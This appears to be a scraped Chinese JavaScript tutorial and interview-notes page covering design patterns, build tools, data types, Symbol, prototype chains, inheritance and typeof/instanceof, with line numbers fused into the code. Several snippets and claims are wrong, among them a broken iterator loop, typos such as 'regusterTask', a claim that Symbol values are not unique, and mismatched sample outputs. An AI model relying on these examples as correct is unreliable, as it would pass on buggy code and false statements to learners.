迭代器模式/遍历器模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// 迭代器模式: 提供一种方法顺序的访问一个聚合对象中的各个元素// 通过类创建class Creator &#123; constructor (list) &#123; this.list = list &#125; createIterator () &#123; return new Iterator(this) &#125;&#125;class Iterator &#123; constructor (creator) &#123; this.list = creator.list this.index = 0 &#125; isDone () &#123; if (this.index &gt;= this.list.length) &#123; return true &#125; return false &#125; next () &#123; return this.list[this.index++] &#125;&#125;var creator = new Creator([1, 2, 3, 4])var iterator = creator.createIterator()console.log(creator.list)while (!creator.isDone) &#123; console.log(iterator.next()) // 1 // 2 // 3 // 4&#125;// 通过原型链创建const colors = ['red', 'green', 'blue']Array.prototype.values2 = function () &#123; let i = 0; let items = this; return &#123; next() &#123; const done = i &gt;= items.length; const value = done ? undefined : items[i++] return &#123; value, done &#125; &#125; &#125;&#125;const iterator = colors.values2() // Array Iterator &#123;&#125;// 调用next()，返回相应的元素值，直到done为trueconsole.log(iterator.next()) // &#123;value: "red", done: false&#125;console.log(iterator.next()) // &#123;value: "green", done: false&#125;console.log(iterator.next()) // &#123;value: "blue", done: false&#125;console.log(iterator.next()) // &#123;value: undefined, done: true&#125;console.log(iterator.next()) // &#123;value: undefined, done: true&#125;// ES6中的迭代器包括：Array、Symbol、Map、Set、NodeList、arguments、typeArray// 以上有序数据集合都部署了Symbol.iterator属性，常见的包括obj[Symbol.iterator]()、obj.keys()、obj.values()、obj.entries() 行为型: 观察者模式1234567891011121314151617181920212223242526272829303132333435363738394041424344// 观察者模式: 定义对象间的一对多关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知// 示例: 爸爸、妈妈 观察 宝宝的状态// 被观察者class Subject &#123; constructor (name) &#123; this.name = name this.state = '' this.observers = [] &#125; // 添加观察者 attach (observer) &#123; this.observers.push(observer) &#125; // 修改状态，通知观察者 setState (state) &#123; this.state = state this.observers.forEach((observer) =&gt; &#123; observer.update(this) &#125;) &#125;&#125;// 观察者class Observer &#123; constructor (name) &#123; this.name = name &#125; // 观察者收到状态变化，进行状态更新 update (vm) &#123; console.log(`$&#123;this.name&#125; 知道了宝宝的状态是：$&#123;vm.state&#125;`) &#125;&#125;const baby = new Subject('宝宝')const father = new Observer('爸爸')const mother = new Observer('妈妈')baby.attach(father)baby.attach(mother)// 修改宝宝的状态，爸爸妈妈能够知道baby.setState('happy')baby.setState('sad') 行为型: 订阅发布模式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192// 订阅发布模式: 订阅者(Subscriber)把事件注册(Subscribe)到调度中心，当发布者(Publisher)发布该事件到调度中心，也就是触发事件时，由调度中心统一调度。// Vue中的 EventBus 就是一个典型的订阅发布模式，先订阅（on/once 定义事件），再发布（emit 执行事件）this.$on('event', (data) =&gt; &#123;&#125;)this.$emit('event', data)function EventBusClass () &#123; this.eventObj = &#123;&#125; // 调度中心，管理事件队列&#125;EventBusClass.prototype = &#123; // 订阅消息 on: function (event, fn) &#123; const vm = this vm.eventObj[event] = fn return vm // 链式 &#125;, // 订阅一次消息 once: function (event, fn) &#123; // vm.eventObj[event] = fn // vm.off(event) const vm = this function helper() &#123; fn.apply(vm, arguments) vm.off(event) &#125; vm.on(event, helper) return vm &#125;, // 发布消息 emit: function (event, msg) &#123; const vm = this // 未订阅的忽略 if (!this.eventObj.hasOwnProperty(event)) return this.eventObj[event](msg) return vm &#125;, // 销毁消息 off: function (event) &#123; const vm = this // 未订阅的忽略 if (!this.eventObj.hasOwnProperty(event)) return delete this.eventObj[event] return vm &#125;&#125;const EventBus = new EventBusClass()// 订阅function on_a () &#123; EventBus.on('click', (data) =&gt; &#123; console.log(data) &#125;)&#125;function on_b () &#123; EventBus.on('dbClick', (data) =&gt; &#123; console.log(data) &#125;)&#125;// 订阅一次function once_a () &#123; EventBus.once('click', (data) =&gt; &#123; console.log(data) &#125;)&#125;function once_b () &#123; EventBus.once('dbClick', (data) =&gt; &#123; console.log(data) &#125;)&#125;// 发布function emit_a () &#123; EventBus.emit('click', &#123;a: 1&#125;)&#125;function emit_b () &#123; EventBus.emit('dbClick', &#123;b: 1&#125;)&#125;// 销毁function off () &#123; EventBus.off('click')&#125;function off_all () &#123; EventBus.off()&#125;// 链式调用function chain () &#123; EventBus .on('mouseup', (data) =&gt; &#123; console.log(data) &#125;) .emit('mouseup', &#123;c: 1&#125;)&#125; gulp和grunt的不同 转载：简书 如何看待 Grunt、Gulp 和 Webpack 相信小伙伴们不仅听说过 Gulp 和 webpack ，还听说过 Grunt。一般都觉得他们都是打包工具，但其实还是有区别的 。更准确的讲，Grunt 和 Gulp 属于任务流工具Tast Runner , 而 webpack属于模块打包工具 Bundler Tast Runner Grunt 123456789101112131415// Gruntfile.jsmodule.exports = function(grunt) &#123; grunt.initConfig(&#123; // js格式检查任务 jshint: &#123; src: 'src/test.js' &#125; // 代码压缩打包任务 uglify: &#123;&#125; &#125;); // 导入任务插件 grunt.loadnpmTasks('grunt-contrib-uglify'); // 注册自定义任务, 如果有多个任务可以添加到数组中 grunt.regusterTask('default', ['jshint'])&#125; Gulp 123456789101112131415161718192021// gulpfile.jsvar gulp = require('gulp');var jshint = require('gulp-jshint');var uglify = require('gulp-uglify');// 代码检查任务 gulp 采取了pipe 方法，用流的方法直接往下传递gulp.task('lint', function() &#123; return gulp.src('src/test.js') .pipe(jshint()) .pipe(jshint.reporter('default'));&#125;);// 压缩代码任务gulp.task('compress'， function() &#123; return gulp.src('src/test.js') .pipe(uglify()) .pipe(gulp.dest('build'));&#125;);// 将代码检查和压缩组合，新建一个任务gulp.task('default', ['lint', 'compress']); Bundler browserifybrowserify 是早期的模块打包工具，是先驱者，踏实的浏览器端使用 CommonJS 规范（require--module.export）的格式组织代码成为可能。在这之前，因为 CommonJS 与浏览器特性的不兼容问题，更多使用的是 AMD（defined--require）规范，当然后来又发展了ES6模块规范（require--export）假设有如下模块add.js 和 文件test.js，test.js 使用CommonJS规范导入了模块add.js 12345678// add.jsmodule.exports = function(a, b) &#123; return a + b&#125;;// test.jsvar add = require('./add.js');console.log(add(1, 2)); // 3 我们知道，如果直接执行是执行不成功的，因为浏览器无法识别 CommonJS 语法，而 browserify 就是用来处理这个问题的，他将 CommonJS 语法进行装换，在命令行执行功如下： 1browserify test.js &gt; bundle.js 生成的bundle.js就是已经处理完毕，可供浏览器执行使用的文件，只需要将它插入到 &lt;script&gt; 中即可。 webpackwebpack 是后起之秀，它支持了 AMD 和 CommonJS 类型，通过 loader 机制也可以使用ES6模块格式。还有强大的 code splitting。webpack 是个十分强大的工具，它正在想一个全能型的构建工具发展。 webpack 通过配置文件 webpack.config.js 进行功能配置，一个配置案例如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445'use strict'const path = require('path')const webpack = require('webpack')const HtmlWebpackPlugin = require('html-webpack-plugin')const merge = require('webpack-merge')const utils = require('./utils')var config = &#123; // 入口 entry: &#123; app: './src/main.js' &#125;, // 出口 output: &#123; path: config.build.assetsRoot, filename: '[name].js', publicPath: process.env.NODE_ENV === 'production' ? config.build.assetsPublicPath : config.dev.assetsPublicPath &#125;, // 加载器配置（需要加载器转化的模块类型） module: &#123; rules: [ &#123; test: '/\.css$/', use: [ 'style-loader', 'css-loader' ] &#125; ] &#125; // 插件 plugins: [ new webpack.DefinePlugin(&#123; 'process.env': require('../config/dev.env') &#125;), new webpack.HotModuleReplacementPlugin(), new HtmlWebpackPlugin(&#123; filename: 'index.html', template: 'index.html', inject: true &#125;), ]&#125;module.exports = config 一个相对比较全面的配置主要包含五个部分： 入口，出口，加载器，插件，模式。分别指定了开始读取文件的位置，编译后输出文件的路径，ES6语法转化加载器，更复杂功能的插件以及指定执行的环境变量。 区别gulp 和 grunt 是流管理工具，通过一个个task配置执行用户需要的功能，如格式检验，代码压缩等，值得一提的是，经过这两者处理的代码只是局部变量名被替换简化，整体并没有发生改变，还是你的代码。 而 webpack 则进行了更彻底的打包处理，更加偏向对模块语法规则进行转换。主要任务是突破浏览器的鸿沟，将原本浏览器不能识别的规范和各种各样的静态文件进行分析，压缩，合并，打包，最后生成浏览器支持的代码，因此，webapck 打包过后的代码已经不是你写的代码了，或许你再去看，已经看不懂啦！ JavaScript的数据类型（按存储方式区分）： 五种基本数据类型（值类型）：Null、Undefined、Boolean、String、Number，是不可拆分的数据类型，存在于栈中。 1234var a = 100;var b = a;b = 200;console.log(a); // 100 一种复杂数据类型（引用类型）：统称 Object ，包括Object、Array、Function、Date、RegExp、String、Boolean、Error和自定义类，也就是通常意义上所说的类，存在于堆中，引用类型会共用存储空间。 1234var a = &#123;age: 18&#125;;var b = a;b.age = 20;console.log(a.age); // 20 ES6新增一种Symbol类型 参考：http://es6.ruanyifeng.com/#docs/symbol 值不唯一，通常用作对象的“键”值或私有属性 12345678910111213141516Symbol() // Symbol()typeof Symbol() // 'symbol'Symbol() === Symbol() // false// 为了做区分，可设置一个参数作为描述Symbol('ZhangSan') === Symbol('LiSi') // false// 属性Symbol().description // undefinedSymbol('ZhangSan').description // ZhangSan// 方法：Symbol().toString() // "Symbol()"String(Symbol()) // "Symbol()"Boolean(Symbol()) // trueNumber(Symbol()) // TypeError: Cannot convert a Symbol value to a number 设置对象Symbol属性的方法，同样适用于普通对象： 1234567891011121314151617const sys = Symbol()// 第一种let a = &#123;&#125;a[sys] = 'Hello, Symbol'// 第二种let b = &#123; [sys]: 'Hello, Symbol'&#125;// 第三种let c = &#123;&#125;Object.defineProperty(c, sys, &#123; value: 'Hello, Symbol' &#125;)console.log(a[sys], b[sys], c[sys]) // 都输出：'Hello, Symbol'// 注意：不用使用a.sys来获取值，因为点运算符后面总是字符串 例如，一个班级下有很多学生，数据结构如下： 123456789const classRoom = &#123; 'Lily': [1, 18, 'BeiJing'], // id、age、address 'Mary': [2, 19, 'ShangHai'], 'Lily': [3, 20, 'TianJin']&#125;/* Lily: (3) [3, 20, "TianJin"] Mary: (3) [2, 19, "ShangHai"]*/ 输出时发现后面的Lily把前面的覆盖了，这个时候我们可以使用Symbol来改写 12345678910const classRoom = &#123; [Symbol('Lily')]: [1, 18, 'BeiJing'], // id、age、address [Symbol('Mary')]: [2, 19, 'ShangHai'], [Symbol('Lily')]: [3, 20, 'TianJin']&#125;/* Symbol(Lily): (3) [1, 18, "BeiJing"] Symbol(Mary): (3) [2, 19, "ShangHai"] Symbol(Lily): (3) [3, 20, "TianJin"]*/ 以 Symbol 作为键值创建的对象是不可遍历的，没有 for、for...in、for...of 等方法，也不会被 Object.keys()、Object.getOwnPropertyNames()、JSON.stringify() 返回。 但是，它也不是私有属性，有一个 Object.getOwnPropertySymbols() 方法，可以获取指定对象的所有 Symbol 属性名。该方法返回一个数组，成员是当前对象的所有用作属性名的 Symbol 值。 以上面的classRoom为例： 123456789101112const sysArr = Object.getOwnPropertySymbols(classRoom)console.log(sysArr)// [Symbol(Lily), Symbol(Mary), Symbol(Lily)]const classRoomArr = sysArr.map(sys =&gt; classRoom[sys])console.log(classRoomArr)/* 输出一个二维码数组 0: (3) [1, 18, "BeiJing"] 1: (3) [2, 19, "ShangHai"] 2: (3) [3, 20, "TianJin"]*/ JavaScript三大对象 本地对象，如 Object、Array、Function、Date、RegExp、String、Boolean、Error 这些引用类型在运行过程中需要通过 new 来创建所需的实例对象。 内置对象，如 Global、Math、(JSON) 在 ECMAScript 程序开始执行前就存在，本身就是实例化内置对象，开发者无需再去实例化。 内置对象是本地对象的子集。 宿主对象 对于嵌入到网页中的JS来说，其宿主对象就是浏览器提供的对象，浏览器对象有很多，如 Window 和 Document 等。 所有的 DOM 和 BOM 对象都属于宿主对象。 强制（显式）类型转换和隐式类型转换强制（显式）类型转换 调用方法 转换成字符串 toString 转换成数字 parseInt、parseFloat 调用构造函数 Number() Boolean() String() 隐式类型转换 不同类型的变量比较要先转类型，叫做类型转换，类型转换也叫隐式转换。 隐式转换通常发生在运算符加减乘除，等于，还有小于，大于等。 四则运算 1234567891011121314151617181920212223242526271 + '2' = 12; // 数字会先转换成字符串6 / '2' = 3;'6' / 2 = 3;2 - '1' = 1; // 字符串会先转换成数字'2' - 1 = 1;2 * '3' = 6;1 + true = 2;1 + false = 1;1 + undefined = NaN;1 + null = 1;10 &amp;&amp; 0; // 0'' || 'abc'; // abc!window.abc; // trueundefined == null; // truenull == false; // trueundefined == false; // true'0' == 0; // true0 == false; // true'0' == false; // true// 拓展：判断一个变量会被当做 true 还是 falsevar a = 100;console.log(!!a); 判断语句if 语句其中的判断条件会进行类型的转换 123if (some) &#123;&#125;// 等效于if (Boolean(some)) &#123;&#125; 原型链创建对象的几种方式 1、字面量法 1var o1 = &#123;name: 'o1'&#125;; 2、构造函数法（构造函数首字母大写） 12345678var o2 = new Object(&#123;name: 'o2'&#125;);var M = function (name) &#123; this.name = name; // return this // 默认有这一行&#125;;var o3 = new M('o3'); // 实例 3、Object.create()法 1var o4 = Object.create(&#123;name: 'o4'&#125;); 以上的运行结果如下： 我们看到o3和o4的运行结果有些不一样，o3前面的M表示构造函数，o4却不显示属性 但是运行o4.name发现其实是有值的，具体原因参考：leijee blog 1其实是2的一个语法糖，如果要创建一个空对象 1234var o1 = &#123;&#125;;var o2 = new Object();var o3 = Object.create(&#123;&#125;);var o4 = Object.create(null); 只有o4是没有 __proto__ 属性的，它没有继承 Object.prototype 原型链上的属性或者方法,例如：toString(), hasOwnProperty()等方法 构造函数扩展 var arr = [] 其实是 var a = new Array() 的语法糖； var obj = {} 其实是 var a = new Object() 的语法糖； function Foo(){} 其实是 var Foo = new Function(){} 的语法糖； 即 arr 的构造函数是 Array, obj 的构造函数是 Object，Foo 的构造函数是 Function。 原型规则 规则1：所有的引用类型（数组、对象、函数），都具有对象特性，可自由扩展属性（null 除外） 12345678var obj = &#123;&#125;;obj.a = 100; // &#123;a: 100&#125;var arr = [];arr.a = 100; // [a: 100]function fn()&#123;&#125;;fn.a = 100; 规则2：所有的引用类型（数组、对象、函数），都有一个 __proto__ (隐式原型) 属性，属性值是一个普通的对象 123console.log(obj.__proto__);console.log(arr.__proto__);console.log(fn.__proto__); 结果如下图： 规则3：所有的函数，都有一个 prototype (显示原型) 属性，属性值是一个普通的对象 1console.log(fn.prototype); // &#123;constructor: ƒ&#125; 规则4：所有的引用类型（数组、对象、函数），__proto__ (隐式属性) 属性值指向它的构造函数的 prototype (显示原型) 属性值 123console.log(obj.__proto__ === Object.prototype); // trueconsole.log(arr.__proto__ === Array.prototype); // trueconsole.log(fn.__proto__ === Function.prototype); // true 规则5：当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的 __proto__（即它的构造函数的 prototype）中去寻找，如果一层没有找到，就继续往上查找，一直到 Object.prototype 为止。因为 Object.prototype 等于 null 会自动停止。 12345678910111213141516171819202122232425262728293031323334353637// 构造函数function Foo(name, age) &#123; this.name = name;&#125;// 扩展属性（规则1）Foo.prototype.alertName = function () &#123; alert(this.name);&#125;;// 创建一个实例fvar f = new Foo('zhangsan');// 扩展属性（规则1）f.printName = function () &#123; console.log(this.name);&#125;;// 测试f.printName();f.alertName(); // (规则5)// f本身没有 alertName 属性，它会去它自身的隐式原型 即f.__proto__ (也即是它的构造函数的显示原型 Foo.prototype)中去寻找这个属性f.toString(); // (规则5)// f本身没有 toString 属性，它会去它自身的隐式原型 即f.__proto__ (也即是它的构造函数的显示原型 Foo.prototype)中去寻找这个属性// 但是 Foo.prototype 中并没有找到这个属性，但是因为 Foo.prototype 本身也是一个对象，所以会继续向上寻找。// 即f.__proto__.__proto__（也即是Foo.prototype.__proto__，也即是Foo.prototype 的构造函数Object.prototype中查找）// 最终发现了toStringf.abc();// 直到Object.prototype.__proto__ = null，也没有找到abc属性，即停止。f.__proto__ === Foo.prototype; // truef.__proto__.__proto__ === Foo.prototype.__proto__; // trueFoo.prototype.__proto__ === Object.prototype; // truef.__proto__.__proto__ === Object.prototype; // true 循环对象自身的属性对于上例，循环f自身的属性：12345678for (let item in f) &#123; if (f.hasOwnProperty(item)) &#123; console.log(item); &#125;&#125;// name// printName instanceof1234567f instanceof Foo; // f是否是Foo的一个实例// 判断逻辑是：// f的 __proto__ 一层一层往上，能否对应到 Foo.prototype，结果为true// 同理：f instanceof Object; // f是否是Object的一个实例，结果为true 构造函数、原型对象、实例、原型链关系网 关系网如下： 123456789101112131415var M = function (name) &#123; this.name = name;&#125;; // 构造函数var o3 = new M('o3'); // 实例o3var o4 = new M('o4'); // 实例o4// M: 是一个构造函数，任何普通函数在使用new运算符之后都变成构造函数// o3、o4: 实例// M.prototype: 原型对象// M.prototype.constructor: 原型对象的构造器，M.prototype.constructor === M// o3.__proto__: 实例的__prto__属性，o3.__proto__ === M.prototype// 实际上函数也有__proto__属性，M.__proto__ === Function.prototype，这个逻辑说明M构造函数是Function的一个实例 面试题：写一个原型链继承的demo12345678910111213141516171819202122232425262728293031323334353637// 父类function A() &#123; this.name = 'test name';&#125;A.prototype.getName = function() &#123; return this.name;&#125;// 子类Bfunction B() &#123; this.age = 12;&#125;// B继承AB.prototype = new A();B.prototype.getAge = function() &#123; return this.age;&#125;// 子类Cfunction C() &#123; this.sex = 'male';&#125;// C继承BC.prototype = new B();C.prototype.getSex = function() &#123; return this.sex;&#125;// 创建实例（abc是C的实例，C继承B，B继承A，所以abc可以调用A、B、C的方法）var abc = new C();console.log(abc.getSex()); // maleconsole.log(abc.getAge()); // 12console.log(abc.getName()); // test name 打印 console.dir(abc); 从图中我们可以看出，通过 prototype 扩展的属性会挂载在 __proto__ 属性下，通过 hasOwnProperty 方法可过滤扩展的属性12abc.hasOwnProperty('sex'); // trueabc.hasOwnProperty('getSex'); // false 我们可以打印一下隐式原型 __proto__ 和显式原型 prototype 的关系图 打印 console.log(abc.prototype)，输出为 undefined，我们可以知道，实例是没有 prototype 属性的 面试题：写一个实际应用中使用原型链的例子123456789101112131415161718192021222324252627282930313233343536373839// 实现类似jquery html()和on(event, fn)方法function Elem(id) &#123; this.elem = document.getElementById(id);&#125;// 扩展一个设置html内容的方法Elem.prototype.html = function(val) &#123; var elem = this.elem; if(val) &#123; elem.innerHTML = val; return this; // 链式操作 &#125; else &#123; return elem.innerHTML; &#125;&#125;// 扩展一个事件绑定的方法Elem.prototype.on = function(type, fn) &#123; var elem = this.elem; elem.addEventListener(type, fn); return this; // 链式操作&#125;var div1 = new Elem('div1');// console.log('div1');div1.html('&lt;p&gt;hello word&lt;/p&gt;'); // 设置html内容div1.on('click', function() &#123; // 绑定一个点击事件 alert('clicked');&#125;);// 我们在扩展html方法的时候写了一个 return this返回这个实例，就可以实现类似jquery链式操作的功能div1.html('&lt;p&gt;hello word&lt;/p&gt;').on('click', function() &#123; // 绑定一个点击事件 alert('clicked');&#125;);// 因为我们在每个扩展的方法里面都写了一个return this，所以链式操作的顺序可以调换// 甚至我们可以重复调用多次扩展的方法div1.html('&lt;p&gt;hello word&lt;/p&gt;').html('&lt;p&gt;Hello Word&lt;/p&gt;'); 面试题：描述 new 一个对象的过程123456function Foo(name, age) &#123; this.name = name; this.age = age; // return this;&#125;var f = new Foo('zhangsan', 18); 创建一个对象f this 指向这个新对象 执行代码，即对 this 赋值 返回 this，内部会有一句默认的 return this 面向对象ECMAScript中有两种开发模式：函数式编程和面向对象（OOP）。 什么是面向对象面向对象只是过程式代码的一种高度封装，目的在于提高代码的开发效率和可维护性。 它将真实世界各种复杂的关系，抽象为一个个对象，然后由对象之间的分工与合作，完成对真实世界的模拟。在面向对象程序开发思想里，每一个对象都是功能中心，具有明确的分工。因此面向对象具有：灵活、代码可复用、高度模块化等特点，容易维护和开发。 面向对象语言有一个标志–类，通过类可以创建任意个具有相同属性和方法的对象。 定义类 ES5 12345function Animal(name) &#123; this.name = name;&#125;new Animal('dog'); // Animal &#123;name: "dog"&#125; 注：如果不传参数时，括号可省略 ES6 class 1234567class Animal2 &#123; constructor(name) &#123; this.name = name; &#125;&#125;new Animal2('cat'); // Animal2 &#123;name: "cat"&#125; ES5继承1、借助构造函数实现简单继承只能继承构造函数里面的属性和方法，不能继承原型链（proto）上的属性和方法123456789101112131415161718function Parent(name) &#123; this.name = name this.run = function () &#123; console.log(`$&#123;this.name&#125; is running`) &#125;&#125;Parent.prototype.work = function () &#123; console.log(`$&#123;this.name&#125; is working`)&#125;function Child(name)&#123; Parent1.call(this, name) // 也可使用apply&#125;var c1 = new Child('Zhangsan')console.log(c1.name) // Zhangsanc1.run() // Zhangsan is runningc1.work() // Error 2、借助原型链实现继承能继承构造函数 和 原型链上的属性和方法，但是无法传参对于引用类型（如数组），多个实例共用地址，修改其中一个，其他的也会跟着改变123456789101112131415161718192021222324252627282930function Parent(name) &#123; this.name = name this.flag = false this.values = [1, 2, 3] this.run = function () &#123; console.log(`$&#123;this.name&#125; is running`) &#125;&#125;Parent.prototype.work = function () &#123; console.log(`$&#123;this.name&#125; is working`)&#125;function Child()&#123;&#125;Child.prototype = new Parent()var c2 = new Child('Zhangsan')var c3 = new Child('Lisi')console.log(c2.name) // undefinedc2.run() // undefined is runningc2.work() // undefined is workingc2.flag = truec2.values.push(4)console.log(c2.flag, c3.flag) // true、falseconsole.log(c2.values, c3.values) // [1, 2, 3, 4]、[1, 2, 3, 4]，对于引用类型，多个实例共用地址// 原型链解释：// 调用name、run()、work()时，先查找实例c2自身的属性和方法，没有查到。// 就去查找实例的构造函数的prototype（即Child2.prototype，也即是c2.__proto__），找到了name、run()// 继续向下插槽Parent2.prototype（即c2.__proto__），找到了work() 3、组合方法（构造函数 + 原型链）能继承构造函数 和 原型链上的属性和方法，也可以传参123456789101112131415161718192021222324252627function Parent(name) &#123; this.name = name this.value = [1, 2, 3] this.run = function () &#123; console.log(`$&#123;this.name&#125; is running`) &#125;&#125;Parent.prototype.work = function () &#123; console.log(`$&#123;this.name&#125; is working`)&#125;function Child(name)&#123; Parent.call(this, name)&#125;Child.prototype = new Parent()var c1 = new Child('Zhangsan')var c2 = new Child('Lisi')console.log(c1.name) // Zhangsanc1.run() // Zhangsan is runningc1.work() // Zhangsan is workingc1.value.push(4);console.log(c1.value, c2.value); // [1, 2, 3, 4]、[1, 2, 3] // 这种组合方式有一个弊端：// 执行Parent.call的时候父类构造函数会执行一次，每次实例化的时候又会执行一次，造成内存浪费// 本例中Parent共被执行三次 4、组合方法优化1（构造函数 + 原型链）123456789101112131415161718192021222324252627282930313233function Parent(name) &#123; this.name = name this.value = [1, 2, 3] this.run = function () &#123; console.log(`$&#123;this.name&#125; is running`) &#125;&#125;Parent.prototype.work = function () &#123; console.log(`$&#123;this.name&#125; is working`)&#125;function Child(name)&#123; Parent.call(this, name)&#125;Child.prototype = Parent.prototypevar c1 = new Child('Zhangsan')var c2 = new Child('Lisi')console.log(c1.name) // Zhangsanc1.run() // Zhangsan is runningc1.work() // Zhangsan is workingc1.value.push(4);console.log(c1.value, c2.value); // [1, 2, 3, 4]、[1, 2, 3] // 新问题：我们无法判断 `c1` 是 `Child` 的实例还是 `Parent` 的实例console.log(c1 instanceof Child); // trueconsole.log(c1 instanceof Parent); // trueconsole.log(c1.constructor);/*ƒ Parent(name) &#123; ***&#125; */ 5、组合方法优化2（构造函数 + 原型链）12345678910111213141516171819202122232425262728293031323334function Parent(name) &#123; this.name = name this.value = [1, 2, 3] this.run = function () &#123; console.log(`$&#123;this.name&#125; is running`) &#125;&#125;Parent.prototype.work = function () &#123; console.log(`$&#123;this.name&#125; is working`)&#125;function Child(name)&#123; Parent.call(this, name)&#125;Child.prototype = Object.create(Parent.prototype)// 该方法创建一个新对象，并使用现有的对象来提供新创建的对象的__proto__，可理解为浅拷贝Child.prototype.constructor = Child;var c1 = new Child('Zhangsan')var c2 = new Child('Lisi')console.log(c1.name) // Zhangsanc1.run() // Zhangsan is runningc1.work() // Zhangsan is workingc1.value.push(4);console.log(c1.value, c2.value); // [1, 2, 3, 4]、[1, 2, 3]console.log(c1 instanceof Child); // trueconsole.log(c1 instanceof Parent); // trueconsole.log(c1.constructor);/*ƒ Child(name) &#123; ***&#125; */ ES6 Class继承类的申明1234567891011121314151617181920212223242526272829303132333435let methodName = 'info'class User &#123; constructor(name, email) &#123; this.name = name; this.email = email &#125; // 普通方法：只能通过实例来调用 // 也可以通过计算属性来定义 // [methodName]() &#123; info() &#123; console.log(`Hi, I'm $&#123;this.name&#125;, my email is $&#123;this.email&#125;`) &#125; // 静态方法：只通过类来调用，不能通过实例来调用 // 类似于Array.from()方法，只能在Array原型上调用，而push方法可以在new Array()实例上调用 static description() &#123; console.log('I\'m a description') &#125; set github(value) &#123; this.githubName = value &#125; get github() &#123; return `https://github.com/$&#123;this.githubName&#125;` &#125;&#125;// 实例化const codecasts = new User('codecasts', '111@codecasts.com');const awesome = new User('awesome', '999@awesome.com');codecasts.github = 'Pimi'console.log(codecasts.github) // https://github.com/Pimi 类的继承1234567891011121314151617181920212223242526272829303132333435// 父类class Animal &#123; constructor(name) &#123; this.name = name this.belly = [] &#125; eat(food) &#123; this.belly.push(food) &#125; speak() &#123; console.log(`Hi, I'm $&#123;this.name&#125;`) &#125;&#125;// 子类class Dog extends Animal&#123; constructor(name, age) &#123; super() // 非常重要 this.name = name this.age = age &#125; bark() &#123; console.log('Bark bark') &#125; // 子类重写，会覆盖父类的方法 speak() &#123; console.log(`Bark bark, Hi, I'm $&#123;this.name&#125;`) &#125;&#125;const lucky = new Dog('lucky', 2) 扩建Array定义一个myArray类，完全继承Array12345678910111213class myArray extends Array&#123; constructor() &#123; super() &#125;&#125;const colors = new myArray()colors[0] = 'red'console.log(colors.length)colors.length = 0console.log(colors[0]) 基于 Array 实现一个 MoviewCollection，第一个参数为一个特殊描述，后续为不定个数的统一数据结构的对象123456const movies = new MoviewCollection('favorite movies', &#123; name: 'The Croolds', scores: 8.7 &#125;, &#123; name: 'The Shawshank Redemption', scores: 9.6 &#125;, &#123; name: 'Leon', scores: 9.4 &#125;, &#123; name: 'Days of Summer', scores: 8.0 &#125;,) 实现：123456789101112131415161718192021222324252627class MoviesCollection extends Array&#123; constructor(desc, ...items) &#123; super(...items) // this指向的是实例 this.desc = desc &#125; add(movie) &#123; this.push(movie) &#125;&#125;const movies = new MoviesCollection('favorite movies', &#123; name: 'The Croolds', scores: 8.7 &#125;, &#123; name: 'The Shawshank Redemption', scores: 9.6 &#125;, &#123; name: 'Leon', scores: 9.4 &#125;,)movies.push(&#123; name: 'Last Day', scores: 7.0 &#125;)/*[ &#123;name: "The Croolds", scores: 8.7&#125;, &#123;name: "The Shawshank Redemption", scores: 9.6&#125;, &#123;name: "Leon", scores: 9.4&#125;, &#123;name: "Last Day", scores: 9&#125;, desc: "favorite movies"]*/ 此外，我们还可以在子类中添加一个 TopRated 的方法，在 add 后面添加：123456789101112131415161718192021// limit表示取前几项排序topRated(limit = 10) &#123; // 升序 return this.sort((a, b) =&gt; a.scores - b.scores).slice(0, limit) // return this.sort((a, b) =&gt; (a.scores &gt; b.scores) ? 1 : -1).slice(0, limit) // 降序 // return this.sort((a, b) =&gt; b.scores - a.scores).slice(0, limit) // return this.sort((a, b) =&gt; (b.scores &gt; a.scores) ? 1 : -1).slice(0, limit)&#125;movies.topRate()/*[ &#123;name: "The Croolds", scores: 8.7&#125;, &#123;name: "Last Day", scores: 9&#125;, &#123;name: "Leon", scores: 9.4&#125;, &#123;name: "The Shawshank Redemption", scores: 9.6&#125;, desc: 4]*/ typeof 和 instanceofJavaScript常使用 typeof 和 instanceof 来判断一个变量是否为空或者是什么类型。 typeof typeof的定义和用法：返回值是一个字符串，用来说明变量的数据类型。 typeof 一般返回：undefined、boolean、string、number、function、object，注意不等同于js的基本类型12345678910111213typeof undefined; // 'undefined'typeof true; // 'boolean'typeof 'abc'; // 'string'typeof 123; // 'number'typeof null; // 'object'typeof []; // 'object'typeof &#123;&#125;; // 'object'typeof new Set(); // 'object'typeof new Map(); // 'object'typeof Object; // 'funciton'typeof Array; // 'function'typeof function () &#123;&#125;; // 'function'typeof console.log; // 'function' 获取一个变量是否存在 1if (typeof a !== 'undefined') &#123;&#125; 而不要使用 1if (a) &#123;&#125; a如果不存在（未申明）时会报错。 对于 Array, Null 等特殊对象使用 typeof 一律返回 object，这正是 typeof 的局限性，可以借助 instanceof instanceOf instanceof定义和用法：instanceof 用于判断一个变量是否属于某个对象的实例。 注：不能检测 null 和 undefined。 1a instanceof b; // a是b的实例 123var a = new Array(); console.log(a instanceof Array); // trueconsole.log(a instanceof Object); // true，因为数组是对象的实例 12345678910111213141516var a = '123'console.log(a instanceof String) // false// 虽然类型为string，但是并不是String对象，没有创建实例var b = new String()console.log(b instanceof String) // true// 拓展：var str1 = '123'var str2 = new String('123') // String &#123;"123"&#125;var str3 = String('123')console.log(typeof str1) // 'string', 基本类型console.log(typeof str2) // 'object', 引用类型console.log(typeof str3) // 'string', 基本类型console.log(str1 === str2) // falseconsole.log(str1 === str3) // true 123function test()&#123;&#125;;var a = new test(); // a是一个实例console.log(a instanceof test); // true 12null instanceof Null; // Uncaught ReferenceError: Null is not definedundefined instanceof Undefined; // Uncaught ReferenceError: Undefined is not defined js检测一个变量是String类型 es5方法 方法1：typeof 123function isString(str) &#123; return typeof str === 'string';&#125; 方法2：constructor 1234function isString(str) &#123; // return str.constructor === String; return str.__proto__.constructor === String;&#125; 方法3：Object.prototype.toString.call 12345678910111213141516function isString(str) &#123; return Object.prototype.toString.call(str) === '[object String]';&#125;// 拓展：Object.prototype.toString.call(1); // '[object Number]'Object.prototype.toString.call(''); // '[object String]'Object.prototype.toString.call([]); // '[object Array]'Object.prototype.toString.call(&#123;&#125;); // '[object Object]'Object.prototype.toString.call(true); // '[object Boolean]'Object.prototype.toString.call(null); // '[object Null]'Object.prototype.toString.call(undefined); // '[object 